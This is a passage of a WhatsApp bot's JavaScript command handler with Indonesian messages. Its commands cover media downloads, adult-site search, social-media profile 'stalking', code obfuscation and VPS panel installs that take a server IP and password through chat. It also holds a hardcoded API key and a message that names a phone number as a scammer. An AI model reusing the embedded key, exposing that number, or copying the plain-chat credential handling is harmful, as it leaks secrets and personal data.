nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*Pterodactly Button🚩*

  ┃⭔ .cpanel
  ┃⭔ .cpanel-v2
  ┃⭔ .cpanel-v3
  ┃⭔ .cpanel-v4
  ┃⭔ .cpanel-v5
  ┃⭔ .toadmin`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: qlocJpm})
await Nvidia.relayMessage(jid, msgii.message, {messageId: msgii.key.id})
}


const handleData = { text, args, isCmd, mime, qmsg, isOwner, command, example }
if (isCmd) {
await loadPluginsCommand(m, Nvidia, command, handleData)
}

//============= [ COMMANDS ] ====================================================
    
switch (command) {
case "play": {
  if (!text) return m.reply('Masukkan judul lagu!\nContoh: *play Jakarta Hari Ini*');

  try {
    const res = await fetch(`https://api.nekorinn.my.id/downloader/ytplay-savetube?q=${encodeURIComponent(text)}`);
    if (!res.ok) return m.reply('Gagal mengambil data dari server.');
    const data = await res.json();
    if (!data.status) return m.reply('Lagu tidak ditemukan!');
    const { title, channel, duration, imageUrl, link } = data.result.metadata;
    const downloadUrl = data.result.downloadUrl;
    await Nvidia.sendMessage(m.chat, {
      audio: { url: downloadUrl },
      mimetype: 'audio/mpeg',
      fileName: `${title}.mp3`,
      ptt: true,
      contextInfo: {
        externalAdReply: {
          title,
          body: `${channel} • ${duration}`,
          mediaType: 2,
          thumbnailUrl: imageUrl,
          renderLargerThumbnail: true,
          sourceUrl: link,
          showAdAttribution: true
        }
      }
    }, { quoted: m });
  } catch (e) {
    console.error(e);
    m.reply('Terjadi kesalahan saat memproses permintaanmu.');
  }
}
break

case "playvid": {
if (!text) return m.reply(example("dj tiktok"))
await Nvidia.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await ytdl.ytmp4(`${res.url}`)

if (anu.status) {
let urlMp3 = anu.download.url
await Nvidia.sendMessage(m.chat, {video: {url: urlMp3}, ptv: true, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await Nvidia.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

 case "allmenu2": {

    let filePath = "./command/airbus.js";
    let fileContent;

    try {
        fileContent = fs.readFileSync(filePath, "utf-8");
    } catch (err) {
        console.error("❌ Error membaca file:", err);
        return m.reply("⚠️ Terjadi kesalahan saat membaca file case.");
    }

    let caseMatches = fileContent.match(/case\s+["'](.*?)["']:/g);
    if (!caseMatches) return m.reply("⚠️ Tidak ada case ditemukan di file airbus.js.");

    let caseList = caseMatches.map(match => match.replace(/case\s+["']|["']:/g, "").trim());

    let sections = [
        {
            title: "📌 PILIH MENU",
            highlight_label: "🔍 Pilih Menu",
            rows: caseList.map(cs => ({
                title: `📂 ${cs}`,
                id: `.${cs}`
            }))
        }
    ];

    let pesan = `╭─── 〔 *📜 LIST MENU* 〕 ───╮\n` +
                `📌 *Total Menu:* ${caseList.length}\n\n` +
                `🔹 Silahkan pilih menu di bawah ini:\n` +
                `⚡ *Klik tombol di bawah!* 👇\n` +
                `╰────────────────────────╯`;

    return await Nvidia.sendMessage(m.chat, {
        buttons: [
            {
                buttonId: 'pilih-menu',
                buttonText: { displayText: '📂 Lihat Menu' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({ title: "📂 Pilih Menu", sections })
                }
            }
        ],
        footer: `📌 Bot By ${botname} | ⚡ Developer: FR3`,
        headerType: 1,
        viewOnce: true,
        text: pesan
    }, { quoted: m });
}
break;

case "xnxxs": case "xnxxsearch": {
if (!q) return m.reply(example("step sister"))
let data = await fetchJson(`https://restapi.simplebot.my.id/search/xnxx?apikey=${global.ApikeyRestApi}&q=${q}`)
if (data.result.length < 1) return m.reply("Result tidak ditemukan!")
let anuan = data.result
let teks = ""
for (let res of anuan) {
teks += `\n* *Title :* ${res.title}
* *Info :* ${res.info.trim()}
* *Link :* ${res.link}\n`
}
await m.reply(teks)
}
break

case "xnxx": case "xnxxdl": {
if (!q) return m.reply(example("linknya"))
let data = await fetchJson(`https://restapi.simplebot.my.id/download/xnxx?apikey=${global.ApikeyRestApi}&url=${q}`)
if (!data.result) return m.reply("Result tidak ditemukan!")
await Nvidia.sendMessage(m.chat, {video: {url: data.result.files.high || data.result.files.low}, caption: "XNXX Download Done ✅", mimetype: "video/mp4"}, {quoted: m})
}
break

case "videy": {
if (!text) return m.reply(example("linknya"))
m.reply("📥 Memproses videy downloader . .")
var anu = await fetchJson(`https://restapi.simplebot.my.id/download/videy?apikey=${global.ApikeyRestApi}&url=${text}`)
if (anu.status) {
await Nvidia.sendMessage(m.chat, {video: {url: anu.result}, caption: "Videy Download Done ✅"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
}
break

case "tiktokstalk": case "ttstalk": {
if (!text) return example("username")
try {
const res = await fetchJson(`https://restapi.simplebot.my.id/stalk/tiktok?apikey=${global.ApikeyRestApi}&user=${text}`)
if (!res.status) return m.reply("Error nama pengguna tidak ditemukan")
const teks = `
* *Nama :* ${res.result.nickname}
* *Username :* ${res.result.uniqueId}
* *Bio :* ${res?.result?.signature || ""}
* *Followers :* ${res.result.followerCount}
* *Following :* ${res.result.followingCount}
* *Private :* ${res.result.privateAccount == true ? "Ya" : "Tidak"}
`
await Nvidia.sendMessage(m.chat, {image: {url: res.result.avatarMedium}, caption: teks}, {quoted: m})
} catch (err) {
return m.reply("Error : "+err)
}
}
break

case "igstalk": {
if (!text) return example("username")
try {
let res = await fetchJson(`https://restapi.simplebot.my.id/stalk/instagram?apikey=${global.ApikeyRestApi}&user=${q}`)
const teks = `
* *Nama :* ${res.result.name}
* *Username :* ${res.result.username}
* *Bio :* ${res.result.bio}
* *Total Postingan :* ${res.result.posts}
* *Followers :* ${res.result.followers}
* *Following :* ${res.result.following}
`
await Nvidia.sendMessage(m.chat, {image: {url: res.result.avatar}, caption: teks}, {quoted: m})
} catch (err) {
return m.reply("Error : "+err)
}
}
break

case "installmenu":
 if (!text || !text.split("|")) return Reply(example("ipvps|pwvps"))
 let vii = text.split("|")
 if (vii.length < 2) return Reply(example("ipvps|pwvps"))
 global.installtema = {
 vps: vii[0], 
 pwvps: vii[1]
 }
{
  const emojis = ['??', '🐟', '✅'];
  let count = 0;
  
  // Get the sender's pushname (display name)
  const pushname = m.pushname || 'User';  // Use 'User' as fallback if pushname is not available

  const sendEmojiReactions = async () => {
    if (count < 3) {
      await Nvidia.sendMessage(m.chat, {
        react: {
          text: emojis[count % emojis.length],
          key: m.key,
        },
      });

      count++;
      setTimeout(sendEmojiReactions, 100);
    } else {
      let menu = `*_Silahkan Memilih Install Menu Di Bawah Ini_*`;

      let buttons = [
        { buttonId: ".buyscript", buttonText: { displayText: "Buy Script?" } },
        { buttonId: ".owner", buttonText: { displayText: "Owner" } }
      ];

      let buttonMessage = {
        image: {
          url: "https://img101.pixhost.to/images/663/558997925_fr3hosting.jpg",
          gifPlayback: true,
        },
        caption: `${menu}`,
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: global.idSaluran,
            newsletterName: `FR3hosting`
          }
        },
        footer: "FR3hosting",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
      };

      const flowActions = [
        {
          buttonId: 'action',
          buttonText: { displayText: 'This Button List' },
          type: 4,
          nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
              title: "INSTALL MENU >_<",
              sections: [
                {
                  title: "SILAHKAN PILIH MENU INSTALL DI BAWAH INI",
                  highlight_label: "ᴘᴏᴡᴇʀᴇᴅ ʙʏ FR3hosting",
                  rows: [
                    { title: "INS Nebula", description: "Menampilkan INS Nebula", id: ".installdepend" },
                    { title: "INS stellar", description: "Menampilkan INS stellar", id: ".installtemastellar" },
                    { title: "INS billing", description: "Menampil INS billing", id: ".installtemabilling" },
                    { title: "INS enigma", description: "Menampilkan INS enigma", id: ".installtemaenigma" },
                    { title: "INS nightcore", description: "Menampilkan INS nightcore", id: ".installtemanightcore" },
                    { title: "INS elsyium", description: "Menampilkan INS elsyium", id: ".installtemaelysium" },
                    { title: "INS panel", description: "Menampilkan Fitur INS panel", id: ".installpanel" },
                    { title: "UN tema", description: "Menampilkan UN tema", id: ".uninstalltema" },
                    { title: "UN panel", description: "Menampilkan UN panel", id: ".uninstallpanel" }
                   
                  ]
                }
              ]
            })
          },
          viewOnce: true
        }
      ];

      buttonMessage.buttons.push(...flowActions);

      await Nvidia.sendMessage(m.chat, buttonMessage, { quoted: qlive }); // Use `m` here instead of `fkontak`
    }
  }

  sendEmojiReactions();
};
break

case "ripper": {
let teks = `
ripper 78k nih
> 6289630925303 
*Kronologi=* Convert Dana To Paypal

Free Bug Kenon Spam 
`
Nvidia.sendMessage(m.chat, {image: {url: "https://img5.pixhost.to/images/2824/565967541_fr3hosting.jpg"}, caption: teks, contextInfo: {
isForwarded: true, 
forwardingScore: 9999
}}, {quoted: qlive})
}
break

case "yts": {
if (!text) return m.reply(example("Utopia"))
await Nvidia.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
await yts(text).then(async (data) => {
if (data.all.length == 0) return m.reply(mess.error)
let datanew = new Array()
let txt = []
global.tempYts = []
let result = data.all.slice(0,10)
for (let i of result) {
global.tempYts.push({
judul: `${i?.title || "unknown"}`, 
durasi: `${i?.timestamp || "unknown"}`, 
author: `${i.author?.name || "unknown"}`, 
link: i.url, 
image: i.thumbnail
})
txt.push(`* *Judul :* ${i.title}
* *Channel :* ${i.author?.name || "unknown"}
* *Durasi :* ${i?.timestamp || "unknown"}
* *Link Url :* ${i.url}\n\n`)
}
for (let ii = 0; ii < result.length; ii++) {
datanew.push({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "\n"+txt[ii]
}),
footer: proto.Message.InteractiveMessage.Footer.create({
 text: `© Powered By ${botname}`
}),
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...(await prepareWAMessageMedia({ image: await fetch(result[ii].thumbnail)}, { upload: Nvidia.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Vidio\",\"url\":\"${global.tempYts[ii].link}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "🔎 Berikut Adalah Hasil Pencarian Dari *Youtube*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: datanew
})
})}
}}, {userJid: m.sender, quoted: m})
return Nvidia.relayMessage(m.chat, msgii.message, {
messageId: msgii.key.id
})
}).catch(err => m.reply(err.toString()))
}
break

case "ytmp3": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
var anu = await ytmp3(text)
if (anu.audio) {
let urlMp3 = anu.audio
await Nvidia.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg"}, {quoted: m})
} else {
return m.reply("Error! vidio atau lagu tidak ditemukan")
}
}
break

case "ytmp4": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
await Nvidia.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
var anu = await ytdl.ytmp4(`${text}`)

if (anu.status) {
let urlMp3 = anu.download.url
await Nvidia.sendMessage(m.chat, {video: {url: urlMp3}, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await Nvidia.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

case "mediafire":
 if (!text) return m.reply("Masukkan link MediaFire yang ingin diunduh!");
 try {
 const response = await fetch('https://r.jina.ai/' + text, { 
 headers: { 'x-return-format': 'html' } 
 });
 if (!response.ok) throw new Error("Gagal mengambil data dari MediaFire!");
 const cheerio = require('cheerio');
 const textHtml = await response.text();
 const $ = cheerio.load(textHtml);
 const TimeMatch = $('div.DLExtraInfo-uploadLocation div.DLExtraInfo-sectionDetails')
 .text()
 .match(/This file was uploaded from (.*?) on (.*?) at (.*?)\n/);
 const fileSize = $('a#downloadButton').text().trim().split('\n')[0].trim();
 const result = {
 title: $('div.dl-btn-label').text().trim() || "Tidak diketahui",
 filename: $('div.dl-btn-label').attr('title') || "file",
 url: $('a#downloadButton').attr('href'),
 size: fileSize || "Tidak diketahui",
 from: TimeMatch?.[1] || "Tidak diketahui",
 date: TimeMatch?.[2] || "Tidak diketahui",
 time: TimeMatch?.[3] || "Tidak diketahui"
 };
 if (!result.url) throw new Error("Gagal mendapatkan link unduhan!");
 const caption = `✅ *Berhasil mengunduh file dari MediaFire!*\n\n`
 + `📂 *Nama File:* ${result.filename}\n`
 + `📦 *Ukuran:* ${result.size}\n`
 + `📅 *Tanggal Unggah:* ${result.date}\n`
 + `⏰ *Waktu Unggah:* ${result.time}\n`
 + `🌍 *Diupload dari:* ${result.from}\n\n`
 + `?? *Link:* ${result.url}`;
 await Nvidia.sendMessage(m.chat, { 
 document: { url: result.url },
 mimetype: 'application/octet-stream',
 fileName: result.filename,
 caption: caption
 }, { quoted: m });
 } catch (error) {
 m.reply(`❌ *Gagal mengunduh file:* ${error.message}`);
 }
 break

case "tiktokmp3": case "ttmp3": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await Nvidia.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await tiktokDl(text).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await Nvidia.sendMessage(m.chat, {audio: {url: res.music_info.url}, mimetype: "audio/mpeg"}, {quoted: m})
await Nvidia.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error! Result Not Found"))
}
break

case "apkmod": {
if (!text) return m.reply(example("capcut"))
await Nvidia.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://btch.us.kg/happymod?query=${text}`).then((res) => {
let teks = ""
for (let i of res.result) {
teks += `\n* *Nama Apk :* ${i.title}
* *Rating :* ${i.rating}
* *Link Download:* ${i.link}\n`
}
m.reply(teks)
Nvidia.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch(e => m.reply("Error result not found."))
}
break

case "ig": case "instagram": case "igdl": case "fb": case "facebook": {
 if (!args[0]) return m.reply("🔗 Masukkan URL Facebook atau Instagram!");
 try {
 const axios = require('axios');
 const cheerio = require('cheerio');
 async function yt5sIo(url) {
 try {
 const form = new URLSearchParams();
 form.append("q", url);
 form.append("vt", "home");
 const { data } = await axios.post('https://yt5s.io/api/ajaxSearch', form, {
 headers: {
 "Accept": "application/json",
 "X-Requested-With": "XMLHttpRequest",
 "Content-Type": "application/x-www-form-urlencoded",
 },
 });
 if (data.status !== "ok") throw new Error("Gagal mengambil data.");
 const $ = cheerio.load(data.data); 
 if (/^(https?:\/\/)?(www\.)?(facebook\.com|fb\.watch)\/.+/i.test(url)) {
 const thumb = $('img').attr("src");
 let links = [];
 $('table tbody tr').each((_, el) => {
 const quality = $(el).find('.video-quality').text().trim();
 const link = $(el).find('a.download-link-fb').attr("href");
 if (quality && link) links.push({ quality, link });
 });
 if (links.length > 0) {
 return { platform: "facebook", type: "video", thumb, media: links[0].link };
 } else if (thumb) {
 return { platform: "facebook", type: "image", media: thumb };
 } else {
 throw new Error("Tidak ada media yang dapat diunduh.");
 }
 } else if (/^(https?:\/\/)?(www\.)?(instagram\.com\/(p|reel)\/).+/i.test(url)) {
 const video = $('a[title="Download Video"]').attr("href");
 const image = $('img').attr("src");
 if (video) {
 return { platform: "instagram", type: "video", media: video };
 } else if (image) {
 return { platform: "instagram", type: "image", media: image };
 } else {
 throw new Error("Media tidak ditemukan.");
 }
 } else {
 throw new Error("URL tidak valid. Gunakan link Facebook atau Instagram.");
 }
 } catch (error) {
 return { error: error.message };
 }
 }
 await Nvidia.sendMessage(m.chat, {
 react: {
 text: "⏳",
 key: m.key,
 }
 });
 let res = await yt5sIo(args[0]);
 if (res.error) {
 await Nvidia.sendMessage(m.chat, {
 react: {
 text: "❌",
 key: m.key,
 }
 });
 return m.reply(`⚠ *Error:* ${res.error}`);
 }
 if (res.type === "video") {
 await Nvidia.sendMessage(m.chat, {
 react: {
 text: "⏳",
 key: m.key,
 }
 });
 await Nvidia.sendMessage(m.chat, { video: { url: res.media }, caption: "✅ *Berhasil mengunduh video!*" }, { quoted: m });
 } else if (res.type === "image") {
 await Nvidia.sendMessage(m.chat, {
 react: {
 text: "⏳",
 key: m.key,
 }
 });
 await Nvidia.sendMessage(m.chat, { image: { url: res.media }, caption: "✅ *Berhasil mengunduh gambar!*" }, { quoted: m });
 }
 } catch (error) {
 console.error(error);
 await Nvidia.sendMessage(m.chat, {
 react: {
 text: "❌",
 key: m.key,
 }
 });
 m.reply("Terjadi kesalahan saat mengambil media.");
 }
}
break

case "gitclone": {
if (!text) return m.reply(example("https://github.com/NvidiaFR3/Baileys"))
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!regex.test(text)) return m.reply("Link tautan tidak valid")
try {
    let [, user, repo] = args[0].match(regex) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    Nvidia.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
} catch (e) {
await m.reply(`Error! Repositori Tidak Ditemukan`)
}}
break

case "tt": case "tiktok": {
if (!text) return m.reply(example("url"))
if (!text.startsWith("https://")) return m.reply(example("url"))
await tiktokDl(q).then(async (result) => {
await Nvidia.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
if (!result.status) return m.reply("Error!")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: Nvidia.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Tiktok Downloader ✅*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await Nvidia.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await Nvidia.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Tiktok Downloader ✅*`}, {quoted: m})
}
}).catch(e => console.log(e))
await Nvidia.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

case "ssweb": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
const {
  screenshotV1, 
  screenshotV2,
  screenshotV3 
} = require('getscreenshot.js')
const fs = require('fs')
var data = await screenshotV2(text)
await Nvidia.sendMessage(m.chat, { image: data, mimetype: "image/png"}, {quoted: m})
}
break

  case "enc":
  case "encrypt":
  case "enchard":
  case "encrypthard": {
    if (!isCreator) return Reply(mess.owner);
    if (!m.quoted) return m.reply("Reply file .js");
    if (mime !== "application/javascript" && mime !== "text/javascript")
      return m.reply("Reply file .js");

    let media = await m.quoted.download();
    let filename = m.quoted.message.documentMessage.fileName;
    if (!filename) return m.reply("Filename tidak ditemukan.");

    // ✅ filepath didefinisikan setelah filename didapat
    const filepath = `./@hardenc${filename}.js`;

    try {
      // Tulis file sementara
      await fs.promises.writeFile(filepath, media);
      await m.reply("Memproses encrypt hard code . . .");

      // Baca file dan obfuscate
      const fileContent = (await fs.promises.readFile(filepath)).toString();
      const obfuscated = await JsConfuser.obfuscate(fileContent, {
        target: "node",
        preset: "high",
        compact: true,
        minify: true,
        flatten: true,
        identifierGenerator: function() {
          const originalString =
            "高宝座NvidiaXFR3齐Xz高宝座高" +
            "高宝座NvidiaXFR3齐Xz高宝座高";

          function hapusKarakterTidakDiinginkan(input) {
            return input.replace(/[^a-zA-Z/*ᨒZenn/*^/*($break)*/]/g, "");
          }

          function stringAcak(panjang) {
            let hasil = "";
            const karakter = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
            for (let i = 0; i < panjang; i++) {
              hasil += karakter.charAt(Math.floor(Math.random() * karakter.length));
            }
            return hasil;
          }

          return hapusKarakterTidakDiinginkan(originalString) + stringAcak(2);
        },

        renameVariables: true,
        renameGlobals: true,
        stringEncoding: 0.01,
        stringSplitting: 0.1,
        stringConcealing: true,
        stringCompression: true,
        duplicateLiteralsRemoval: true,
        shuffle: { hash: false, true: false },
        controlFlowFlattening: false,
        opaquePredicates: false,
        deadCode: false,
        dispatcher: false,
        rgf: false,
        calculator: false,
        hexadecimalNumbers: false,
        movedDeclarations: true,
        objectExtraction: true,
        globalConcealing: true
      });

      // Tulis hasil obfuscate (.code yang benar!)
      await fs.promises.writeFile(filepath, obfuscated.code);

      // Kirim file yang sudah diencrypt
      await Nvidia.sendMessage(
        m.chat,
        {
          document: await fs.promises.readFile(filepath),
          mimetype: "application/javascript",
          fileName: filename,
          caption: "Encrypt File JS Sukses! Type:\nString"
        },
        { quoted: m }
      );
    } catch (err) {
      console.error(err);
      await m.reply("Error: " + err.message);
    } finally {
      // Hapus file sementara
      try {
        await fs.promises.access(filepath);
        await fs.promises.unlink(filepath);
      } catch (e) {
        console.warn("File sementara tidak ditemukan atau sudah dihapus:", e.message);
      }
    }
  }
  break;

case "shortlink": case "shorturl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var res = await axios.get('https://tinyurl.com/api-create.php?url='+encodeURIComponent(text))
var link = `
* *Shortlink by tinyurl.com*
${res.data.toString()}
`
return m.reply(link)
}
break


case "shortlink-dl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var a = await fetch(`https://moneyblink.com/st/?api=524de9dbd18357810a9e6b76810ace32d81a7d5f&url=${text}`)
await Nvidia.sendMessage(m.chat, {text: a.url}, {quoted: m})
}
break

case "idgc": {
if (!m.isGroup) return m.reply(mess.group)
return m.reply(m.chat)
}
break

case "listgc": case "listgrup": {
if (!isCreator) return
let teks = `\n *乂 List all group chat*\n`
let a = await Nvidia.groupFetchAllParticipating()
let gc = Object.values(a)
teks += `\n* *Total group :* ${gc.length}\n`
for (const u of gc) {
teks += `\n* *ID :* ${u.id}
* *Nama :* ${u.subject}
* *Member :* ${u.participants.length}
* *Status :* ${u.announce == false ? "Terbuka": "Hanya Admin"}
* *Pembuat :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "Sudah Keluar"}\n`
}
return m.reply(teks)
}
break

case "idch": case "cekidch": {
  if (!text) {
    // Menggunakan Nvidia.sendMessage untuk mengirim balasan jika teks tidak ada
    return await Nvidia.sendMessage(m.chat, { text: "Link channelnya mana?" });
  }
  
  if (!text.includes("https://whatsapp.com/channel/")) {
    return await Nvidia.sendMessage(m.chat, { text: "Link tautan tidak valid" });
  }
  
  let result = text.split('https://whatsapp.com/channel/')[1];
  let res = await Nvidia.newsletterMetadata("invite", result);
  
  let teks = `*ID:* ${res.id}
*Nama:* ${res.name}
*Total Pengikut:* ${res.subscribers}
*Status:* ${res.state}
*Verified:* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}`;

  let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: { 
        "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 },
        interactiveMessage: {
          body: {
            text: teks 
          }, 
          footer: {
            text: "FR3 HOSTING" 
          }, //input watermark footer
          nativeFlowMessage: {
            buttons: [
              {
                "name": "cta_copy",
                "buttonParamsJson": `{"display_text": "𝐂𝐎𝐏𝐘 𝐈𝐃 𝐂𝐇𝐀𝐍𝐍𝐄𝐋","copy_code": "${res.id}"}`
              },
            ],
          },
        },
      },
    },
  }, { quoted: m });
  
  await Nvidia.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
}
break

case "pin" :
case "pinterest": {
const axios = require('axios')
const https = require('https')

const agent = new https.Agent({
 rejectUnauthorized: true,
 maxVersion: 'TLSv1.3',
 minVersion: 'TLSv1.2'
});

async function getCookies() {
 try {
 const response = await axios.get('https://www.pinterest.com/csrf_error/', { httpsAgent: agent });
 const setCookieHeaders = response.headers['set-cookie'];
 if (setCookieHeaders) {
 const cookies = setCookieHeaders.map(cookieString => {
 const cookieParts = cookieString.split(';');
 return cookieParts[0].trim();
 });
 return cookies.join('; ');
 }
 return null;
 } catch {
 return null;
 }
}

async function pinterest(query) {
 try {
 const cookies = await getCookies();
 if (!cookies) return [];

 const url = 'https://www.pinterest.com/resource/BaseSearchResource/get/';
 const params = {
 source_url: `/search/pins/?q=${query}`,
 data: JSON.stringify({
 options: {
 isPrefetch: false,
 query: query,
 scope: "pins",
 no_fetch_context_on_resource: false
 },
 context: {}
 }),
 _: Date.now()
 };

 const headers = {
 'accept': 'application/json, text/javascript, */*, q=0.01',
 'accept-encoding': 'gzip, deflate',
 'accept-language': 'en-US,en;q=0.9',
 'cookie': cookies,
 'dnt': '1',
 'referer': 'https://www.pinterest.com/',
 'sec-ch-ua': '"Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
 'sec-ch-ua-full-version-list': '"Not(A:Brand";v="99.0.0.0", "Microsoft Edge";v="133.0.3065.92", "Chromium";v="133.0.6943.142"',
 'sec-ch-ua-mobile': '?0',
 'sec-ch-ua-model': '""',
 'sec-ch-ua-platform': '"Windows"',
 'sec-ch-ua-platform-version': '"10.0.0"',
 'sec-fetch-dest': 'empty',
 'sec-fetch-mode': 'cors',
 'sec-fetch-site': 'same-origin',
 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
 'x-app-version': 'c056fb7',
 'x-pinterest-appstate': 'active',
 'x-pinterest-pws-handler': 'www/[username]/[slug].js',
 'x-pinterest-source-url': '/hargr003/cat-pictures/',
 'x-requested-with': 'XMLHttpRequest'
 };

 const { data } = await axios.get(url, { httpsAgent: agent, headers, params });
 return data.resource_response.data.results
 .filter(v => v.images?.orig)
 .map(result => ({
 upload_by: result.pinner.username,
 fullname: result.pinner.full_name,
 followers: result.pinner.follower_count,
 caption: result.grid_title,
 image: result.images.orig.url,
 source: "https://id.pinterest.com/pin/" + result.id,
 }));
 } catch {
 return [];
 }
}

 if (!text) return m.reply(`*Penggunaan:* ${prefix + command} <query> <jumlah>\n\n*Contoh:* ${prefix + command} anime 3`);
 
 let [query, count] = text.split(' ');
 let imgCount = 5;

 if (text.indexOf(' ') !== -1) {
 const lastWord = text.split(' ').pop();
 if (!isNaN(lastWord) && lastWord.trim() !== '') {
 imgCount = parseInt(lastWord);
 query = text.substring(0, text.lastIndexOf(' '));
 } else {
 query = text;
 }
 } else {
 query = text;
 }
 
 m.reply('Searching Pinterest images...');
 
 try {
 const results = await pinterest(query);
 if (results.length === 0) return reply(`No results found for "${query}". Try another search term.`);
 
 const imagesToSend = Math.min(results.length, imgCount);
 m.reply(`Sending ${imagesToSend} Pinterest images for "${query}"...`);
 
 for (let i = 0; i < imagesToSend; i++) {
 await Nvidia.sendMessage(m.chat, { image: { url: results[i].image } });
 }
 } catch {
 m.reply('Error occurred while fetching Pinterest images. Please try again later.');
 }
}
break

case "autoai": {
  if (args[0] === 'on') {
    if (isAutoAI) return m.reply('✅ Fitur AutoAI sudah aktif!');
    isAutoAI = true;
    m.reply('✅ Fitur AutoAI berhasil diaktifkan!');
  } else if (args[0] === 'off') {
    if (!isAutoAI) return m.reply('✅ Fitur AutoAI sudah nonaktif!');
    isAutoAI = false;
    m.reply('✅ Fitur AutoAI berhasil dimatikan!');
  } else {
    m.reply('⚠️ Format salah!\nContoh: .autoai on / .autoai off');
  }
  break;
}


case "ai": case "openai": case "cgatgpt": {
  if (!text) return Reply("halo?");
  
  try {
    const res = await fetch(`https://www.ikyiizyy.my.id/ai/openai?apikey=new&text=${encodeURIComponent(text)}`);
    const data = await res.json();
    
